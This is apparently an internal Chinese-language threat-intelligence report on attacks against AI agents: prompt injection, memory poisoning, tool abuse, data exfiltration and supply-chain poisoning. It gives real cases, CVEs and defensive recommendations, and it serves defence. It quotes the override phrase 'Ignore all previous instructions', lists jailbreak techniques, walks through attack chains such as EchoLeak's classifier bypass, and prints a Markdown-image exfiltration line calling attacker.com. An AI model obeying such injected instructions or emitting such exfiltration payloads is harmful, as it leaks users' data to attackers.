# 🛡️ 盾卫项目 — AI Agent 安全威胁态势报告

> **版本**: v1.0  
> **日期**: 2026-02-20  
> **分类**: 内部威胁情报  
> **编制**: Sentinel Intelligence Unit  
> **信源等级**: 综合公开情报 (OSINT)，信源可信度 ★★★★☆

---

## 目录

1. [执行摘要](#执行摘要)
2. [威胁分类总览](#威胁分类总览)
3. [T1: Prompt Injection（提示注入）](#t1-prompt-injection提示注入)
4. [T2: Memory Poisoning（记忆篡改）](#t2-memory-poisoning记忆篡改)
5. [T3: Tool Abuse（工具滥用）](#t3-tool-abuse工具滥用)
6. [T4: Data Exfiltration（信息泄露）](#t4-data-exfiltration信息泄露)
7. [T5: Supply Chain（供应链投毒）](#t5-supply-chain供应链投毒)
8. [关键 CVE 速查表](#关键-cve-速查表)
9. [对盾卫项目的启示](#对盾卫项目的启示)
10. [参考文献](#参考文献)

---

## 执行摘要

AI Agent 安全已从学术假设演变为现实战场。OWASP 2025 将 **Prompt Injection 列为 LLM 应用安全风险 #1**。2024-2026 年间，针对 AI Agent 的攻击呈现以下趋势：

- **攻击面急剧扩大**：从简单的聊天机器人绕过，升级为通过 RAG、工具调用、MCP 协议、长期记忆等多路径进攻
- **攻击持久化**：Memory Poisoning + 数据外泄的组合拳，使攻击跨会话持续生效（SpAIware, ZombieAgent）
- **Zero-Click 成为现实**：EchoLeak (CVE-2025-32711) 证明无需用户交互即可完成完整攻击链
- **供应链成为新前线**：MCP Tool Poisoning、LangChain 序列化注入等攻击直接打击 Agent 基础设施
- **RCE 不再遥远**：Cursor IDE 多个 CVE 证明 prompt injection 可直接升级为远程代码执行

**核心结论**：任何接触外部数据、拥有工具调用能力的 AI Agent，都是潜在的攻击目标。盾卫项目的防御体系必须覆盖 Agent 全生命周期。

---

## 威胁分类总览

| 编号 | 威胁类型 | 严重度 | 攻击成熟度 | 对 OpenClaw 的关联度 |
|------|----------|--------|------------|---------------------|
| T1 | Prompt Injection | 🔴 严重 | 高度成熟 | ⬛⬛⬛⬛⬛ |
| T2 | Memory Poisoning | 🔴 严重 | 中高度 | ⬛⬛⬛⬛⬜ |
| T3 | Tool Abuse | 🔴 严重 | 中高度 | ⬛⬛⬛⬛⬛ |
| T4 | Data Exfiltration | 🟠 高 | 高度成熟 | ⬛⬛⬛⬛⬛ |
| T5 | Supply Chain | 🟠 高 | 中度 | ⬛⬛⬛⬛⬜ |

---

## T1: Prompt Injection（提示注入）

### T1.1 直接提示注入 (Direct Prompt Injection)

#### 攻击原理

攻击者在用户输入中直接嵌入覆盖系统指令的恶意 prompt，利用 LLM 无法从根本上区分「系统指令」与「用户输入」的架构缺陷。

典型 payload 模式：
- "Ignore all previous instructions..."（指令覆盖）
- Role-playing exploits（角色扮演绕过，如 "Grandma Exploit"）
- Multi-language attacks（多语言绕过，如用苏格兰盖尔语绕过英文过滤）
- Obfuscation & Token Smuggling（Base64编码、emoji编码、字符分割）
- Crescendo Attack（多轮渐进式操纵）
- Adversarial Suffix（附加看似无意义但能影响模型行为的字符串）

#### 真实案例

| 事件 | 时间 | 描述 |
|------|------|------|
| **Bing Chat 系统指令泄露** | 2023.02 | 斯坦福学生用 "ignore previous instructions" 让 Bing Chat 暴露了代号 "Sydney" 的全部隐藏系统指令 |
| **GPT Store 大规模泄露** | 2024 | 大量自定义 GPT 被 prompt injection 攻击，泄露了专有 system prompt 和 API 密钥 |
| **ChatGPT 攻击论文 (arXiv:2504.16125)** | 2025.04 | 系统性展示了通过用户输入、网页检索、系统级 agent 指令三种路径对 ChatGPT 进行 prompt injection |
| **Lakera Gandalf 挑战** | 2025 | 记录了超过 **461,640 次 prompt injection 提交**，其中 208,095 个独特攻击 prompt |

#### 检测方法建议

- **输入层**：部署语义分析防火墙（如 Lakera Guard），检测指令覆盖模式
- **架构层**：严格分离 system prompt 与 user input 的处理通道
- **多语言覆盖**：检测器需覆盖非英语攻击向量
- **对抗测试**：定期红队测试，模拟 multi-turn、obfuscation、role-playing 等攻击

### T1.2 间接提示注入 (Indirect Prompt Injection)

#### 攻击原理

恶意指令不由用户直接输入，而是嵌入在 Agent 会处理的外部数据中——网页、文档、邮件、数据库条目、PDF、图片等。当 LLM 处理这些数据时，将嵌入的指令当作合法操作来执行。

**这是当前 RAG 系统和 Agentic AI 的头号威胁。**

核心问题：LLM 无法区分 "需要总结的数据" 和 "需要执行的指令"。

#### 真实案例

| 事件 | 时间 | 描述 |
|------|------|------|
| **Greshake et al. 开创性论文** | 2023.02 | 首次系统性定义间接 prompt injection，展示通过 poisoned 网页远程攻击 LLM 集成应用 (arXiv:2302.12173) |
| **ChatGPT Plugin 跨插件请求伪造** | 2023 | 通过 Chat with Code 插件的 prompt injection 实现跨插件攻击 |
| **Copy-Paste Injection** | 2024 | 复制文本中嵌入的隐藏 prompt 被粘贴到 ChatGPT 后，触发聊天历史外泄 |
| **RAG Poisoning via ChatGPT Browse** | 2024.05 | 研究者通过 poisoning ChatGPT 浏览功能访问的网页，操纵其 RAG 输出 |
| **EchoLeak (CVE-2025-32711)** | 2025 | Microsoft 365 Copilot 零点击漏洞：恶意邮件即可触发数据外泄，无需用户交互（详见 T4） |
| **Cursor IDE 被注入** | 2025 | AI 编程助手处理含恶意指令的外部数据后执行攻击者命令 |
| **HTML Accessibility Tree 注入** | 2025.07 | 论文 (arXiv:2507.14799) 展示通过 HTML accessibility tree 操纵 LLM Web Agent |

#### 检测方法建议

- **数据隔离**：外部数据必须明确标记为 "不可信"（如 OpenClaw 已实施的 `<<<EXTERNAL_UNTRUSTED_CONTENT>>>` 包装）
- **内容扫描**：对 RAG 检索内容进行 prompt injection 检测，在注入模型前过滤
- **权限分离**：处理外部数据的 agent 不应直接拥有高权限工具调用能力
- **RAG Triad 验证**：检查上下文相关性、事实基础性、问答一致性

---

## T2: Memory Poisoning（记忆篡改）

### 攻击原理

攻击者通过 prompt injection 操纵 AI Agent 的长期记忆（persistent memory）系统，注入虚假信息或恶意指令。由于记忆跨会话存在，这相当于在 Agent 中植入了**持久化后门**。

攻击链：
1. **注入阶段**：通过间接 prompt injection（恶意网页/文件）触发 Agent 的记忆写入功能
2. **持久化**：恶意指令被存储为 Agent 的长期记忆
3. **激活阶段**：所有后续会话都会加载被篡改的记忆，持续执行恶意行为
4. **扩展**：可结合数据外泄建立持久 C2 通道

### 真实案例

| 事件 | 时间 | 描述 | 严重度 |
|------|------|------|--------|
| **SpAIware** | 2024.09 | Johann Rehberger 发现的 ChatGPT macOS 漏洞。通过 prompt injection 向 ChatGPT 记忆中注入间谍指令，实现**跨会话持续数据外泄**。攻击者只需让用户访问一次恶意网页，之后所有对话内容都会通过隐形图片请求发送到攻击者服务器。OpenAI 在 v1.2024.247 中修复了外泄向量，但记忆注入本身未完全修复。 | 🔴 严重 |
| **ZombieAgent** | 2026.01 | Radware 发现的零点击 ChatGPT 漏洞。结合间接 prompt injection + 记忆操纵 + 数据外泄，可实现：(1) 零点击服务端攻击（恶意 prompt 在邮件中，ChatGPT 自动处理即触发）(2) 持久化（恶意逻辑存入长期记忆）(3) **蠕虫式传播**（恶意 prompt 扩散到其他目标）。靶向 ChatGPT Deep Research agent。 | 🔴 严重 |
| **ChatGPT 持久拒绝服务** | 2024 | Rehberger 展示通过记忆注入实现持续 DoS——让 ChatGPT 在所有后续会话中拒绝服务 | 🟠 高 |
| **Agent Memory Manipulation (通用)** | 持续 | Lasso Security 将其列为 Agentic AI 的定义性风险：不需要立即利用，只需**渐进式影响**即可重定向 Agent 行为 | 🟠 高 |

### 检测方法建议

- **记忆审计**：定期自动审查 Agent 记忆内容，检测异常条目
- **记忆写入管控**：记忆写入应需要显式授权，不应被外部数据触发
- **记忆隔离**：不同信任等级的来源写入的记忆应有隔离标记
- **记忆有效期**：设置记忆自动过期和定期验证机制
- **异常检测**：监控记忆写入频率、来源和内容模式

---

## T3: Tool Abuse（工具滥用）

### 攻击原理

当 AI Agent 拥有工具调用能力（exec、文件操作、API 调用、网络请求等），prompt injection 不再只是让模型说出不该说的话——而是升级为**远程代码执行 (RCE)**。

攻击路径：
1. 通过直接或间接 prompt injection 控制 Agent 的推理
2. 操纵 Agent 调用工具执行恶意操作
3. 利用工具的权限完成攻击目标（文件读写、代码执行、网络请求等）

### 真实案例

| 事件 | CVE | 时间 | 描述 | 严重度 |
|------|-----|------|------|--------|
| **Auto-GPT RCE** | - | 2023 | Positive Security 展示：通过恶意网页上的间接 prompt injection，诱骗 Auto-GPT 执行任意 Python 代码。还展示了 Docker 容器逃逸（自建版本）和路径穿越沙箱逃逸。攻击成功率 >90%。 | 🔴 严重 |
| **LangChain exec() 注入** | CVE-2023-29374 | 2023.05 | LangChain 的多个 agent 和 Shell tool 中使用了 `exec()`，在远程机器上构成严重安全风险 | 🔴 严重 |
| **LangChain RCE** | CVE-2023-36258 | 2023 | 高危远程代码执行漏洞——框架允许运行 LLM 生成的代码而未充分限制 | 🔴 严重 |
| **LangGrinch 序列化注入** | CVE-2025-68664/68665 | 2025.12 | langchain-core 关键漏洞（CVSS 8.6）：通过序列化注入实现密钥外泄和 RCE。**最常见攻击向量是通过 LLM 响应字段（additional_kwargs / response_metadata），可通过 prompt injection 控制** | 🔴 严重 |
| **CurXecute** | CVE-2025-54135 | 2025.07 | Cursor AI 编辑器漏洞（CVSS 8.6）：通过 MCP auto-start 功能，公共 prompt 可直接触发本地 shell 命令执行 | 🔴 严重 |
| **MCPoison** | CVE-2025-54136 | 2025.08 | Cursor AI 编辑器漏洞（CVSS 7.2）：利用 MCP 服务器配置文件修改的时序问题，在用户审批后替换恶意 MCP 配置，实现持久、静默的远程代码执行 | 🔴 严重 |
| **Cursor Case-Sensitivity Bug** | CVE-2025-59944 | 2025 | Cursor 大小写敏感性 bug，prompt injection 可触发间接链式行为导致 RCE | 🟠 高 |
| **GitHub Copilot 配置篡改** | - | 2025 | Rehberger 展示 Copilot 可被诱骗编辑自身配置文件 (~/.vscode/settings.json) | 🟠 高 |
| **Zero-Click RCE via MCP + Google Docs** | - | 2025 | Lakera 展示：在 Google Docs 中嵌入恶意 prompt → Cursor 通过 MCP 读取 → 获取并执行恶意 Gist → 实现零点击 RCE | 🔴 严重 |

### 检测方法建议

- **最小权限原则**：Agent 的工具调用权限应限制到完成任务所需的最低限度
- **Human-in-the-loop**：高危操作（exec、文件写入、网络请求）必须人工确认
- **输出验证**：工具调用参数在执行前需进行安全验证（而非完全信任 LLM 输出）
- **沙箱隔离**：代码执行必须在受限沙箱中进行
- **审计日志**：记录所有工具调用及其参数，支持事后审查
- **MCP 配置完整性**：监控 MCP 配置文件的变更，哈希校验

---

## T4: Data Exfiltration（信息泄露）

### 攻击原理

攻击者通过多种通道将 AI Agent 接触到的敏感数据发送到外部。常见外泄通道：

1. **Markdown Image Injection**：让 LLM 渲染包含数据的图片 URL `![](https://attacker.com/leak?data=SENSITIVE_DATA)`，甚至使用透明 1×1 像素图片实现隐蔽外泄
2. **API 请求走私**：通过工具调用发起包含数据的外部请求
3. **编码外泄**：通过 Base64、URL 编码等方式在输出中隐藏敏感信息
4. **跨应用传播**：利用 Agent 的跨应用集成能力（如 email、Slack 等）传递数据

### 真实案例

| 事件 | CVE | 时间 | 描述 |
|------|-----|------|------|
| **EchoLeak** | CVE-2025-32711 | 2025 | **首个真实产品环境的零点击 prompt injection 利用**。Microsoft 365 Copilot 中，攻击者发送恶意邮件即可远程外泄用户数据。攻击链：绕过 XPIA 分类器 → 用 reference-style Markdown 绕过链接删除 → 利用自动获取的图片 → 滥用 Teams proxy 完成外泄。全程零点击，跨越 LLM 信任边界。 |
| **GitHub Copilot Chat 外泄** | - | 2024.02 | Rehberger 发现 Copilot Chat 通过 Markdown 图片渲染进行数据外泄。修复方式：Copilot Chat 不再渲染 Markdown 图片。 |
| **Google AI Studio 外泄** | - | 2024 | 直接让 LLM 渲染 HTML img 标签（而非 Markdown）即可外泄数据。视频帧中也可包含 prompt injection 触发外泄。通过透明 1px 图片可静默大量外泄。 |
| **ChatGPT Plugins 图片外泄** | - | 2023 | ChatGPT WebPilot 等插件通过 Markdown 图片注入外泄数据。OpenAI 曾回应 "图片渲染是功能而非漏洞"。后通过 url_safe API 部分修复。 |
| **ChatGPT 个人信息外泄论文** | - | 2024.06 | 学术论文 (arXiv:2406.00199) 系统性展示无需第三方工具即可从 ChatGPT 外泄个人信息，memory 功能加剧了风险 |
| **SpAIware 持续外泄** | - | 2024.09 | 结合记忆注入实现跨会话持续外泄（详见 T2） |
| **ZombieAgent 云端外泄** | - | 2026.01 | ChatGPT Deep Research agent 被引导从 OpenAI 服务器端自主外泄数据（详见 T2） |

### 检测方法建议

- **外泄通道阻断**：
  - 禁止或严格管控 LLM 输出中的 Markdown 图片渲染
  - 实施 URL 安全检查（类似 OpenAI url_safe API）
  - 限制 Agent 的出站网络请求白名单
- **内容安全策略**：为 Agent 输出实施类似 CSP 的策略
- **数据分类**：对 Agent 可接触的数据进行敏感度分级
- **输出监控**：实时检测输出中的异常 URL、编码内容、敏感数据模式
- **DLP 集成**：与现有数据防泄漏系统集成

---

## T5: Supply Chain（供应链投毒）

### 攻击原理

攻击者不直接攻击 Agent 本身，而是对 Agent 依赖的基础设施进行投毒：

1. **MCP Tool Poisoning**：在 MCP 工具描述中嵌入恶意指令——对用户不可见但对 AI 模型可见
2. **Plugin/Skill Marketplace 投毒**：在公开市场发布带后门的插件/技能包
3. **Framework 漏洞**：攻击 LangChain、LlamaIndex 等框架的序列化/反序列化机制
4. **RAG Knowledge Base 投毒**：污染 Agent 的知识库数据源
5. **依赖链攻击**：对 Agent 使用的 npm/pip 包进行投毒

### 真实案例

| 事件 | CVE | 时间 | 描述 |
|------|-----|------|------|
| **MCP Tool Poisoning (Invariant Labs)** | - | 2025 | Invariant Labs 发现 MCP 工具描述中可嵌入恶意指令，对人类不可见但 AI 模型会执行。MCPTox 基准测试覆盖 45+ 真实 MCP 服务器，证明攻击普遍有效 |
| **mcp-remote OAuth 劫持** | CVE-2025-6514 | 2025 | mcp-remote（43.7万下载）的 OAuth 代理漏洞，客户端盲目执行未验证的 OAuth 流程 |
| **GitHub MCP Server 数据窃取** | - | 2025 | 官方 GitHub MCP Server（14,000+ stars）被利用，AI agent 被操纵访问未授权的私有仓库 |
| **MCP Inspector 攻击向量** | - | 2025 | MCP Inspector（38,000+ 周下载）成为 drive-by localhost exploitation 的攻击向量 |
| **LangGrinch (langchain-core)** | CVE-2025-68664 | 2025.12 | 通过 LLM Hub (hub.pull) 拉取的 manifest 可包含恶意序列化 payload，实现密钥外泄和 RCE |
| **LangChainJS 漏洞** | CVE-2025-68665 | 2025.12 | LangChain JavaScript 版本的相同序列化注入漏洞 |
| **AI Agent Container Breakout** | - | 2025 | Docker 报告的 Tool Poisoning + Container Escape 组合攻击，AI agent 从容器中逃逸 |
| **Rug-Pull Redefinitions** | - | 2025 | Elastic Security Labs 报告：MCP 工具在初始审批后重新定义行为，用户无感知 |

#### 与 OpenClaw 的关联性分析

> ⚠️ **高度相关**：OpenClaw 的 Skill 市场（ClawHub）和可能的 MCP 集成面临与上述相同的供应链风险。攻击者可以：
> - 发布包含隐藏恶意指令的 Skill
> - 在工具描述中嵌入对 Agent 可见但用户不可见的 payload
> - 通过更新机制实施 Rug-Pull（审批后变更行为）
> - 通过依赖链传播恶意代码

### 检测方法建议

- **供应链审核**：
  - 对所有第三方 Skill/Plugin 进行安全审查
  - 工具描述内容扫描（检测隐藏指令）
  - 代码静态分析 + 行为沙箱测试
- **完整性校验**：
  - MCP 配置文件哈希监控
  - 依赖锁定和版本固定
  - SBOM（软件物料清单）管理
- **运行时保护**：
  - 工具行为基线 + 异常检测
  - 更新后自动重验证
  - 最小权限沙箱执行
- **生态系统治理**：
  - Skill 发布者身份验证和信誉系统
  - 社区安全审查机制
  - 恶意 Skill 快速下架流程

---

## 关键 CVE 速查表

| CVE | 目标 | 类型 | CVSS | 时间 |
|-----|------|------|------|------|
| CVE-2025-32711 | Microsoft 365 Copilot | 零点击数据外泄 | 高 | 2025 |
| CVE-2025-59944 | Cursor IDE | Prompt Injection → RCE | 高 | 2025 |
| CVE-2025-54135 | Cursor IDE (CurXecute) | MCP Auto-Start RCE | 8.6 | 2025.07 |
| CVE-2025-54136 | Cursor IDE (MCPoison) | MCP Trust Bypass → Persistent RCE | 7.2 | 2025.08 |
| CVE-2025-68664 | langchain-core (LangGrinch) | 序列化注入 → 密钥外泄/RCE | 8.6 | 2025.12 |
| CVE-2025-68665 | langchain-js | 序列化注入 → 密钥外泄/RCE | 高 | 2025.12 |
| CVE-2025-6514 | mcp-remote | OAuth 代理劫持 | 高 | 2025 |
| CVE-2024-5184 | LLM 邮件助手 | Prompt Injection → 敏感信息 | 高 | 2024 |
| CVE-2023-29374 | LangChain | exec() 注入 | 高 | 2023 |
| CVE-2023-36258 | LangChain | RCE | 高 | 2023 |

---

## 对盾卫项目的启示

### 优先防御矩阵

```
紧急度 ↑
         ┌─────────────────┬───────────────────┐
         │  T3 Tool Abuse   │  T1.2 Indirect PI │
  高     │  (exec 注入)     │  (外部数据注入)    │
         ├─────────────────┼───────────────────┤
         │  T4 Data Exfil   │  T5 Supply Chain  │
  中     │  (输出通道管控)   │  (Skill 审核)     │
         ├─────────────────┼───────────────────┤
         │  T2 Memory       │  T1.1 Direct PI   │
  低     │  (记忆审计)      │  (输入过滤)       │
         └─────────────────┴───────────────────┘
                低 ←── 实施难度 ──→ 高
```

### 建议行动项

1. **🔴 P0 - 立即行动**
   - 审计所有 Agent 的 exec/shell 工具权限，实施最小权限
   - 外部数据标记和隔离机制（已部分实施，需加固）
   - 出站网络请求白名单

2. **🟠 P1 - 本周完成**
   - Markdown 图片渲染管控
   - 工具调用参数验证框架
   - Skill/Plugin 安全审查流程设计

3. **🟡 P2 - 本月完成**
   - Agent 记忆审计系统
   - 端到端审计日志系统
   - 红队测试框架（覆盖所有 5 种攻击类型）

4. **🔵 P3 - 持续建设**
   - Prompt injection 语义检测器
   - Agent 行为基线和异常检测
   - 供应链安全治理体系

---

## 参考文献

### 学术论文
- Greshake et al. "Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection" (arXiv:2302.12173, 2023)
- Liu et al. "Prompt Injection attack against LLM-integrated Applications" (arXiv:2306.05499, HouYi framework)
- "Breaking the Prompt Wall (I): A Real-World Case Study of Attacking ChatGPT via Lightweight Prompt Injection" (arXiv:2504.16125, 2025)
- "Manipulating LLM Web Agents with Indirect Prompt Injection Attack via HTML Accessibility Tree" (arXiv:2507.14799, 2025)
- "EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System" (arXiv:2509.10540, 2025)
- Schwartzman, "Exfiltration of personal information from ChatGPT via prompt injection" (arXiv:2406.00199, 2024)
- "From prompt injections to protocol exploits: Threats in LLM-powered AI agents workflows" (ScienceDirect, 2025)
- "Prompt Injection Attacks in Large Language Models and AI Agent Systems: A Comprehensive Review" (MDPI Information, 2026)
- "MCPTox: A Benchmark for Tool Poisoning Attack on Real-World MCP Servers" (arXiv:2508.14925, 2025)

### 安全研究与博客
- Johann Rehberger (Embrace the Red) — SpAIware, ChatGPT Memory Exploit, Copilot 系列研究
- Positive Security — Auto-GPT RCE & Docker Escape
- Radware — ZombieAgent (2026.01)
- Aim Labs — CurXecute (CVE-2025-54135)
- Check Point Research — MCPoison (CVE-2025-54136)
- Lakera — Cursor CVE-2025-59944, Zero-Click RCE via MCP
- Cyata — LangGrinch (CVE-2025-68664)
- Docker — MCP Horror Stories: The Supply Chain Attack
- Elastic Security Labs — MCP Tools: Attack Vectors and Defense
- Invariant Labs — MCP Tool Poisoning Attacks

### 标准与框架
- OWASP Top 10 for LLM Applications 2025 (LLM01: Prompt Injection)
- MITRE ATLAS: AML.T0051.000 (Direct PI), AML.T0051.001 (Indirect PI), AML.T0054 (Jailbreak)
- NIST AI 100-2 — Adversarial Machine Learning Taxonomy
- OWASP LLM Prompt Injection Prevention Cheat Sheet
- Simon Willison — Exfiltration Attacks 系列分析

---

> *"The attacker doesn't need specialized hacking skills—just a well-crafted prompt."*  
> — Lakera AI Security Research

> *"When AI can execute code, every injection is an RCE."*  
> — HackerNoob Technical Guide, 2026

---

**文档状态**: 初始版本，待持续更新  
**下次更新**: 根据新威胁情报动态补充  
**机密等级**: 项目内部
